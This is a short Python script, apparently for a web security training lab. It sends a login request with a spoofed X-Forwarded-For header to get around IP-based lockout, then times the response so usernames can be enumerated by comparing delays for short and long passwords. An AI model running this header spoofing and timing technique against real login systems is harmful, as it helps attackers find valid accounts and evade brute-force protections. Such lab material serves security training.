import requests, sys
from bs4 import BeautifulSoup

# Get the lab's full site URL from command line
site = sys.argv[1].rstrip('/')  # just in case there's a trailing slash
login_url = f"{site}/login"

# Set initial spoofed IP
req_headers = {
    'X-Forwarded-For': '1.1.1.2',
    'User-Agent': 'Mozilla/5.0',
}

# Start session (no need for CSRF)
s = requests.Session()

# ====== TEST CREDENTIALS ======
# To test login timing: change password values below
logindata = {
    # 'username': 'wiener',
    'username': 'notarealuser',
    # 'password': 'p'  # short
    # 'password': 'a' * 64  # long
    'password': 'a' * 64  # for invalid user test, duplicate
}

# Post login form
resp = s.post(login_url, data=logindata, headers=req_headers)

# Print content (if needed) and timing
print(resp.text)
print(f"Response received in {resp.elapsed.total_seconds()} seconds")
